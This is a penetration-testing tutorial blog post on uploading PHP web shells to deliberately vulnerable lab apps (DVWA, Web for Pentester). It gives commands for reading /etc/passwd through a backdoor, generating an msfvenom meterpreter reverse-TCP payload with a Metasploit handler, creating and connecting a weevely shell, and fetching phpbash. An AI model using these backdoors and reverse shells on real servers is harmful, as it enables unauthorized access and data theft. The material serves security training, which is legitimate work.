<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Web Shells Penetration Testing</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/web-shells-penetration-testing/" rel="bookmark"><time class="entry-date published" datetime="2019-09-25T06:52:39+00:00">September 25, 2019</time><time class="updated" datetime="2025-05-26T16:30:39+00:00">May 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This post will describe how attackers use various PHP web Shell uploading techniques to gain unauthorized access to the webserver by injecting malicious pieces of code written in PHP.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Introduction of PHP Web shells</strong></span></li>
<li><span style="color: #000000;"><strong>Inbuilt Kali’s web shells</strong></span>
<ul>
<li><span style="color: #000000;">simple backdoor.php</span></li>
<li><span style="color: #000000;">qsd-php backdoor web shell</span></li>
<li><span style="color: #000000;">php-reverse-shell.php</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Using MSF venom</strong></span></li>
<li><span style="color: #000000;"><strong>Weevely php web shell </strong></span></li>
<li><span style="color: #000000;"><strong>PHP_bash web shell </strong></span></li>
</ul>
<h3><span style="color: #800000;">Requirements</span></h3>
<p><span style="color: #000000;">Attacker: Kali Linux</span></p>
<p><span style="color: #000000;">Target: Web for Pentester, DVWA</span></p>
<h3><span style="color: #800000;">Introduction of PHP Web Shells</span></h3>
<p><span style="color: #000000;">Attackers code web shells in many languages like PHP, Python, ASP, Perl, and so on, which they then use as a backdoor for illegitimate access to any server by uploading them on a web server.</span></p>
<p><span style="color: #000000;">Once the backdoor uploads to a destination, the attacker can then directly perform the read and write operation, and you can edit any file or delete the server file. Today we are going to explore all kinds of php web shells what-so-ever are available in Kali Linux and so on. So, let’s get started.</span></p>
<p><span style="color: #000000;">Kali Linux has inbuilt PHP Scripts for utilizing them as a backdoor to assist Pen-testing work. They are stored inside <strong>/usr/share/webshells/php </strong>and a pen-tester can directory make use of them without wasting time in writing PHP code for the malicious script.</span></p>
<ul>
<li><span style="color: #000000;">simple backdoor.php</span></li>
<li><span style="color: #000000;">qsd-php backdoor web shell</span></li>
<li><span style="color: #000000;">php-reverse-shell.php</span></li>
</ul>
<h3><span style="color: #800000;">Simplebackdoor.php shell </span></h3>
<p><span style="color: #000000;">Simple-backdoor.php is a kind of web shell that can generate a remote code execution once injected in the web server and script made by “John Troon”. It is already accessible in Kali in the/usr/share/web shells/php folder as shown in the pic below and after that, we will run ls -al command to check the permissions given to the files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/webshells/php
ls -al</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-UQ9gMnwdhbc/XYsHP6iBEYI/AAAAAAAAgsM/nY-BNlNqnggB0ZayiFngT2JFSF4Sq7hcQCLcBGAsYHQ/s1600/1.png"/></strong></span></p>
<p><span style="color: #000000;">Now you must discover a way to upload a shell in your application. As we have to do all this Web for Pentesters, so we will first try to upload here simple backdoor php shell which is already available in kali and click on send the file to upload the shell.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-gTUojqQRQn0/XYsHSr0JPSI/AAAAAAAAgs4/Mla-hDKZxTkMBxzUFa6_KqzEJngi1AhvgCLcBGAsYHQ/s1600/2.png"/></p>
<p><span style="color: #000000;">As you can see, we have successfully uploaded the malicious php file and received the hyperlink for the uploaded file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ys6-oacfifk/XYsHU1lgrKI/AAAAAAAAgtc/qV-I8DIRXdIRs2XRckoNNO-vJKmSS-ygQCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">Thus, we try to access simple-backdoor.php and obtain the following output. As we can observe that here “cmd=cat+/etc/passwd” is a clear indication for Remote code execution.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xvfT3Xy_O5o/XYsHV9tPByI/AAAAAAAAgtk/3gcrDauKC3wNVj77q1maP0B6xYmD3Dw1QCLcBGAsYHQ/s1600/4.png"/></p>
<p> </p>
<p><span style="color: #000000;">So, let’s try and run cat+/etc/passwd to retrieve all the passwords of the server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd=cat+/etc/passwd</pre>
<p><span style="color: #000000;">As a result, we have extracted all records of passwd file, hence we can execute any command such as ls, cp and so on therefore we can obtain web shell by exploiting REC.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-E-yDlXrBvyM/XYsHWft6FgI/AAAAAAAAgto/bEFLoNKrv1g2XYWs2zit90BYTB9pPFYBwCLcBGAsYHQ/s1600/5.png"/></p>
<p> </p>
<h3><span style="color: #800000;">qsd-php backdoor shell </span></h3>
<p><span style="color: #000000;">An exploit of a web shell generally considered as a backdoor that enables an attacker to access and control a server remotely and the qsd-php backdoor shell is a kind of backdoor which provides a platform for executing system command and the wonderful script made by “Daniel Berliner”.</span></p>
<p><span style="color: #000000;">As you can see, we have uploaded the qsd-php-backdoor.php file successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-qxZi2lOFMSA/XYsHW1ehB7I/AAAAAAAAgts/kxxOfostlRcme4Im1YgSlKRSbTOse2DlwCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">Then try accessing qsd-php-backdoor.php as you did in the previous step and you will find something as shown in the image below. Here you can perform directory traversal and you can also access the Web Server directory directly by entering the command and clicking on the go button.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-aMGfCCheG0M/XYsHXeOZLNI/AAAAAAAAgtw/m7r6Xq-PrcAsOCdSCsaV6pOfqhh6lGt4gCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">As you can observe we have accessed the current directory directly without executing any system command.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-oEkF_J3MWb4/XYsHXzKamiI/AAAAAAAAgt0/8oj0IdMe0dAkpbyJZ_ufrIcrSNjZV1GegCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">We can also execute arbitrary system command since this backdoor provides a platform to execute the shell command such cat/etc/passwd, ls -al and much more. We can also run two commands simultaneously and see the result.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Z65_O-aoRIo/XYsHP8y02BI/AAAAAAAAgsQ/quLd_3PjBdolAjB_JZU4ZCTNfcq5RrOYgCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">As you can see that we have got the result successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1pXzjUN4KuI/XYsHP3CvRdI/AAAAAAAAgsU/hx-pI-1EfucZGz-yPefehOa6GZY0CvdhwCLcBGAsYHQ/s1600/11.png"/></p>
<h3><span style="color: #800000;">PHP-reverse shell</span></h3>
<p><span style="color: #000000;">Now its turn to move towards our next php web shell which is php-reverse-shell.php which will open an outbound TCP connection from the webserver to a host and script made by “pentestmonkey”. A shell will be attached to the TCP connection (reverse TCP connection). You can run interactive programs such as telnet, ssh etc with this script. It is different from the other Web shells script, through which you can send a single command and then return the output.</span></p>
<p><span style="color: #000000;">For this, we need to open this script through nano</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano php-reverse-shell.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-B6ePhQhThIY/XYsHQvKK1kI/AAAAAAAAgsY/AClGfPKcc7EsX6PtrzXmEJKpVgL4O86mACLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">Here we need to give the LISTEN_IP (Kali Linux) where we want the connection and LISTEN_PORT number can be set any.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-KJex5cMQYpw/XYsHQxb-rQI/AAAAAAAAgsc/YDDKzj6dtP0EST0k_9hZPPqyJYfAGsC6QCLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;"> Now we need to upload this web shell in order to get the reverse connection. So, we will upload the malicious file and on the other hand start netcat listener inside a new terminal.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/--5Pnp1SLbHo/XYsHRM_9zwI/AAAAAAAAgsg/lexUOW-RlSkw9qexWI4xJliouyJQq46CgCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">We can see that it is uploaded successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-VUF4GsjThmM/XYsHRH5xPYI/AAAAAAAAgsk/WvEnNkmMJN0WFWEoDAxUDL-GcUqtjDKqACLcBGAsYHQ/s1600/15.png"/></p>
<p><span style="color: #000000;">Now as soon as you will execute the uploaded file and If all went well, then, the webserver should have thrown back a reverse shell to your netcat listener. And you can verify that we have got the shell successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-icey_1TqC8o/XYsHRne8x_I/AAAAAAAAgso/TOb2W3c_coAcgC_fP-qYLlw897gD72bXACLcBGAsYHQ/s1600/16.png"/></p>
<h3><span style="color: #000000;"><span style="color: #800000;">PHP Backdoor using MSFvenom</span>  </span></h3>
<p><span style="color: #000000;">We can also generate a php web shell with the help of msfvenom. We, therefore, write use msfvenom following command for generating malicious php code in raw format.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 R</pre>
<p><span style="color: #000000;">Then copy the code and save it by the name of meter.php</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-eQECZj8uQBA/XYsHSJ1_9II/AAAAAAAAgss/mbzWf79R6ZIc4UdKhR8rT1QXkS-t76a7ACLcBGAsYHQ/s1600/17.png"/></p>
<p><span style="color: #000000;">Now we will upload this malicious shell in DVWA lab to get the reverse connection. Now you can see the “meter.php successfully uploaded” message from the screenshot, meaning that our php backdoor is effectively uploaded.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xDYj1pGNSsA/XYsHSCyl_ZI/AAAAAAAAgsw/20TVTPZyVukFv38ZllYrEFqqAv24E3frwCLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">In order to execute the shell, we will open the URL of DVWA.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-_2uQyUAWYQs/XYsHSCM3xgI/AAAAAAAAgs0/N8Rg4zHECp0Wn8vtXhNgiFhvyASt8ufUQCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Simultaneously we will start multi handler where we will get the meterpreter shell and we will run the following commands where we need to specify the lhost and lport to get the reverse connection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.1.106
set lport 4444
exploit
sysinfo</pre>
<p><span style="color: #000000;">As soon as you will explore the uploaded path and execute the backdoor, it will give you a meterpreter session.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-b0dYL1x-MRc/XYsHStPFT0I/AAAAAAAAgs8/AMnFYfTtkFQlZ3VSqRqCbzF7OSARBNugwCLcBGAsYHQ/s1600/20.png"/></p>
<h3><span style="color: #800000;">Weevely Shell</span></h3>
<p><span style="color: #000000;">Weevely serves as a stealthy PHP internet shell that simulates the link to Telnet and enables remote server administration and penetration testing. Users can utilize it as a stealth backdoor web shell to manage legit web accounts, making it an essential tool for web application post-exploitation. We can generate a PHP backdoor protected with the password.</span></p>
<p><span style="color: #000000;">Open the terminal and type weevely to generate a php backdoor and also set a password as in our case we have taken “<strong>raj123</strong>” and save this web shell as <strong>weevely.php</strong> </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">weevely generate raj123 weevely.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XYt8mtKqNh4/XYsHTG-vIdI/AAAAAAAAgtA/vDwUkbk0cA0PIcivtMApNf3kT_x5KZbrQCLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">Now upload this web shell at the target location as in our case we have uploaded it at Web for pen testers and we will open the URL in the browser to execute the web shell.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-_9SvE7ZfQuY/XYsHTGwbRuI/AAAAAAAAgtE/ZgK8-ItaxD0nNwpjYSYcwNkScNFs0FqtQCLcBGAsYHQ/s1600/22.png"/></p>
<p><span style="color: #000000;">Type the following instruction to initiate the webserver attack and put a copied URL into the Weevely command using password raj123. Then, you can see that we have got the victim shell through weevely. We can verify this by id command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">weevely http://192.168.1.104/upload/images/weevely.php raj123
id</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ran8pcF7DiU/XYsHTRI-2WI/AAAAAAAAgtI/yZFY1O4B_A0dDJkd-QssAmVSZtawFaWKwCLcBGAsYHQ/s1600/23.png"/></p>
<p><span style="color: #000000;">You can also check all the functionality of weevely through help command.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-chN6OrUyHt4/XYsHT65kMmI/AAAAAAAAgtM/g-ShNMYgfeQP4zzDVE6nA-BL_XaYSJEAQCLcBGAsYHQ/s1600/24.png"/></p>
<h3><span style="color: #800000;">PHPbash shell </span></h3>
<p><span style="color: #000000;">Phpbash is an internet shell that is autonomous, semi-interactive. We are going to download it from GitHub and then we will go inside the directory phpbash and execute ls -al command to check the available files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Arrexel/phpbash.git
cd phpbash/
ls -al</pre>
<p><span style="color: #000000;">So inside phpbash, we found a php script named “phpbash.php”, upload this script at your target location.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zXhJN8FU3WE/XYsHT_kcYMI/AAAAAAAAgtQ/uijyeTnbEjgvqbovq7R-FxlLk4Yxq2e-gCLcBGAsYHQ/s1600/26.png"/></p>
<p><span style="color: #000000;">Now we will upload this web shell in DVWA lab and we can see the message that it is uploaded successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-F7iuhp-S7oQ/XYsHT6ayb7I/AAAAAAAAgtU/-hsfPgwRmYEPHkwdvLIUSAjSwuNVd0_hQCLcBGAsYHQ/s1600/28.png"/></p>
<p><span style="color: #000000;">Going ahead; we will open the URL to execute the shell.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-f9US3a5-YOc/XYsHUvP8y9I/AAAAAAAAgtY/X6m17pbgZdcjia936P_aQjPfDgRhnrosgCLcBGAsYHQ/s1600/29.png"/></p>
<p><span style="color: #000000;">Here our phpbash malicious file is executed and given the web shell. The benefit of the phpbash is that it doesn’t require any type of listener such as netcat because it has inbuilt bash shell that you can observe from the given image.</span></p>
<p><span style="color: #000000;">As a result, we have bash shell of www-data and we can execute system command directly through this platform.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-65bbWIcsTrg/XYsHVb_RBDI/AAAAAAAAgtg/azY0eT2dKwUjNE8hMGmYRpQsWP0v8i2ywCLcBGAsYHQ/s1600/30.png"/></p>
<p><span style="color: #000000;">So, this way we have explored and performed numerous ways to get the web shell through php web shells. Which you can find under this single article.</span></p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p><span style="color: #000000;"><b>Author</b>: Geet Madan is a Certified Ethical Hacker, Researcher and Technical Writer at Hacking Articles on Information Security<b>. </b>Contact </span><a href="https://www.linkedin.com/in/geet-madan/"><b>here</b></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
